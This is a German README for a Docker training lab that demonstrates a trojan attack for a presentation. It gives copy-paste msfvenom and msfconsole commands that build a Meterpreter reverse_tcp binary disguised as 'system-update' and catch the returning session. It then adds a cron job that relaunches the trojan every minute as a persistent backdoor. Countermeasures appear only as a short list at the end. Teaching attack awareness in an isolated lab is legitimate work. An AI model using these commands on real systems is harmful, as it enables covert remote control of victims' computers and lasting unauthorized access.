# Szenario 2: Trojaner einspielen (Meterpreter-Backdoor)

Live-Demo: Der Angreifer baut eine getarnte ausfuehrbare Datei (**Trojaner**), bringt das Opfer
zum Ausfuehren, erhaelt eine **Meterpreter-Backdoor** und macht sich mit einem Cron-Job
**dauerhaft** im System fest.

## Hintergrund

Nicht jeder Angriff braucht eine Software-Schwachstelle wie in Szenario 1. Sehr oft genuegt eine
**ausfuehrbare Datei + ein unvorsichtiger Klick** (Social Engineering): Eine als „Update" oder
Rechnung getarnte Datei wird per E-Mail/Download/USB verteilt. Sobald das Opfer sie startet, baut
sie eine **Reverse-Verbindung** zum Angreifer auf — der hat ab dann volle Kontrolle, ganz ohne
Exploit.

## Architektur

```
┌──────────────────┐                         ┌──────────────────┐
│    attacker       │   1. msfvenom baut       │     victim        │
│  10.20.0.10       │      Trojaner            │  10.20.0.20       │
│  Metasploit       │                          │  Ubuntu           │
│                   │   2. Datei kommt rueber  │  User: mitarbeiter│
│  multi/handler    │  ───── /transfer ──────▶ │   ~/Downloads/     │
│  lauscht :4444    │     (geteilter Ordner)   │    system-update   │
│                   │ ◀═══ 3. reverse_tcp ═════│  (Trojaner laeuft) │
│  Meterpreter-     │      Backdoor-Session    │                   │
│  Session          │                          │  + Cron-Backdoor   │
└──────────────────┘                         └──────────────────┘
                Docker-Netz: lab (10.20.0.0/24)
```

## Voraussetzungen

- Docker + Docker Compose
- ca. 2 GB freier Speicher (Metasploit-Image)
- Internetverbindung beim ersten Start (Image-Download)

## Start — ein Angreifer-Terminal, ein Opfer-Terminal

Diese Demo spielt zwischen **zwei Maschinen** (zwei Container). Wir trennen sie strikt: pro Maschine
**ein** Terminal, in das du dich „einloggst".

| Terminal | Maschine | Container | Einloggen mit | Wofuer |
|----------|----------|-----------|---------------|--------|
| 🔴 **Angreifer** | Angreifer | `trojan-attacker` | `docker exec -it trojan-attacker bash` | `msfvenom`, `msfconsole` |
| 🟢 **Opfer** | Mitarbeiter-PC | `trojan-victim` | `docker exec -it -u mitarbeiter trojan-victim bash` | Trojaner ausfuehren |

**Faustregel:** Alles passiert im 🔴 **Angreifer-Terminal** — **nur Schritt 3** im 🟢 **Opfer-Terminal**.

**1. Container starten** (einmalig, in irgendeiner Host-Shell):
```sh
cd szenario-2-trojaner-backdoor
docker compose up -d --build
```

**2. 🔴 Angreifer-Terminal oeffnen** — du bist jetzt „auf der Angreifer-Maschine":
```sh
docker exec -it trojan-attacker bash
```
> Prompt sieht etwa so aus: `root@...:/usr/src/metasploit-framework#`

**3. 🟢 Opfer-Terminal oeffnen** (zweites Fenster) — du bist jetzt als `mitarbeiter` „auf dem Opfer-PC":
```sh
docker exec -it -u mitarbeiter trojan-victim bash
```
> Prompt: `mitarbeiter@...:~$`

> Verlassen: in beiden Terminals einfach `exit` — die Container laufen weiter.

## Demo-Ablauf (Copy-Paste-ready)

### Schritt 1: Trojaner bauen — 🔴 Angreifer-Terminal

```sh
./msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.20.0.10 LPORT=4444 -f elf -o /transfer/system-update
```

**Was passiert:**
- `msfvenom` ist der Payload-Generator von Metasploit (ein normales Tool, daher in der Shell)
- erzeugt eine ELF-Programmdatei, die beim Start eine Verbindung zum Angreifer (`LHOST`) aufbaut
- der harmlose Name `system-update` tarnt die Datei
- sie landet im geteilten Ordner `/transfer` — das simuliert den Weg zum Opfer (E-Mail/Download/USB)

**Kontrolle:** `ls -la /transfer/system-update` zeigt die fertige Datei.

---

### Schritt 2: Auf Lauschposten gehen (Handler) — 🔴 Angreifer-Terminal

Jetzt msfconsole starten:

```sh
./msfconsole
```

Dann am `msf6 >`-Prompt:

```
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 10.20.0.10
set LPORT 4444
set ExitOnSession false
run -j
```

**Was passiert:**
- `multi/handler` nimmt die zurueckkommende Verbindung des Trojaners entgegen
- `ExitOnSession false` + `run -j` = Handler laeuft als **Hintergrund-Job** und bleibt aktiv,
  auch nachdem die erste Session aufgegangen ist (wichtig fuer die Backdoor spaeter)

**Erwartet:** `Started reverse TCP handler on 10.20.0.10:4444`

> `Exploit completed, but no session was created.` ist hier **normal** — der Handler wartet jetzt
> nur. Die Session kommt erst, wenn das Opfer in Schritt 3 den Trojaner startet.

---

### Schritt 3: Opfer fuehrt den Trojaner aus — 🟢 Opfer-Terminal

Jetzt spielst du den arglosen **Mitarbeiter**. Der Trojaner wird hier **nicht neu gebaut** — die
fertige Datei aus Schritt 1 liegt schon im geteilten `/transfer`-Ordner. Das Opfer kopiert sie nur
in seinen Downloads-Ordner, macht sie ausfuehrbar und startet sie („Doppelklick"):

```sh
cp /transfer/system-update ~/Downloads/system-update
chmod +x ~/Downloads/system-update
~/Downloads/system-update &
```

(Das `&` startet den Trojaner im Hintergrund, damit das Opfer-Terminal frei bleibt.)

**Warum tut das Opfer das?** Das ist die Social-Engineering-Annahme: Es hat eine als
`system-update` getarnte Datei erhalten (E-Mail/USB/Download — hier simuliert durch `/transfer`)
und fuehrt sie arglos aus. Dieser eine Klick reicht.

**Erwartet:** Im 🔴 **Angreifer-Terminal** erscheint von selbst:
```
[*] Meterpreter session 1 opened ...
```

---

### Schritt 4: Kontrolle uebernehmen — 🔴 Angreifer-Terminal (msfconsole)

In die Session wechseln (Session-ID aus `sessions -l`):

```
sessions -i 1
```

Dann im Meterpreter:

```
getuid
sysinfo
ps
```

**Was passiert:** Wir sind als User `mitarbeiter` auf dem Opfer-Rechner und sehen System-Infos
und laufende Prozesse.

---

### Schritt 5: Backdoor einrichten (Persistenz) — 🔴 Angreifer-Terminal (Meterpreter)

> **⚠️ Achtung — drei Prompt-Ebenen.** Ab hier wechselst du die Ebene. Tippe die Befehle **einzeln**
> (nicht den ganzen Block auf einmal einfuegen) und achte, welcher Prompt vor dir steht:
>
> | Prompt | Ebene | hierhin gehoeren |
> |--------|-------|------------------|
> | `msf6 >` | msfconsole | `sessions`, `background`, `use`, `set` |
> | `meterpreter >` | Session | `getuid`, `shell`, `background` |
> | *(kein Prompt)* | Opfer-Shell (nach `shell`) | normale Linux-Befehle (`crontab`, `cp`, `id`) |

Damit der Zugang **dauerhaft** bleibt, legen wir einen Cron-Job an, der den Trojaner jede Minute
neu startet.

**a)** Am `meterpreter >`-Prompt in die Opfer-Shell wechseln:
```
shell
```

**b)** Jetzt bist du in der Shell des Opfers — **es wird kein Prompt angezeigt**. Tippe genau
**diese eine Zeile** und Enter:
```
(crontab -l 2>/dev/null; echo '* * * * * /home/mitarbeiter/Downloads/system-update') | crontab -
```

**c)** Kontrolle (zeigt die Cron-Zeile), dann zurueck zur Meterpreter-Ebene:
```
crontab -l
exit
```
Nach `exit` bist du wieder bei `meterpreter >`.

**Was passiert:** Selbst wenn das Opfer den Rechner neu startet oder den Prozess beendet — der
Cron-Job startet den Trojaner immer wieder. Der Angreifer hat eine **persistente Backdoor**.

---

### Schritt 6: Backdoor beweisen — 🔴 Angreifer-Terminal (msfconsole)

**a)** Von `meterpreter >` zurueck zur msfconsole:
```
background
```
→ jetzt steht `msf6 >` vor dir.

**b)** Am `msf6 >`-Prompt alle aktiven Sessions killen:
```
sessions -K
```

**c)** Jetzt **ca. 1 Minute warten** (der Cron-Job feuert den Trojaner erneut ab), dann:
```
sessions -l
```

**Erwartet:** Eine **neue** Session (z. B. `session 2`) ist aufgegangen — **ohne** dass das Opfer
etwas getan hat. Der Angreifer ist von selbst zurueck.

## Stop

In einer Host-Shell (ggf. vorher in beiden Terminals `exit`):

```sh
docker compose down -v    # Container + Volumes (inkl. Trojaner) entfernen
```

## Kernaussagen fuer die Praesentation

1. **Kein Exploit noetig** — eine ausfuehrbare Datei + ein Klick genuegen (Social Engineering).
2. **Reverse-Verbindung** umgeht Firewalls: Das Opfer baut die Verbindung nach aussen auf.
3. **Persistenz** macht aus einem einmaligen Zugriff eine dauerhafte **Backdoor**.
4. **Gegenmassnahmen:** Keine unbekannten Dateien ausfuehren, Application Whitelisting,
   Endpoint Protection/AV, ausgehenden Datenverkehr ueberwachen, Least Privilege, Awareness-Schulungen.

## Hinweise

- Das Opfer laeuft bewusst als **normaler User** (`mitarbeiter`), nicht als root — realistisch
  fuer eine Mitarbeiter-Workstation. Echte Angreifer wuerden anschliessend eine
  Privilege-Escalation versuchen (eigenes Thema).
- Beide Container sind nur im internen `lab`-Netz — kein Zugriff auf den Host oder das Internet.
- Szenario 2 nutzt ein eigenes Subnetz (`10.20.0.0/24`), Szenario 1 nutzt `10.10.0.0/24` — sie
  kollidieren also nicht und koennten sogar parallel laufen.
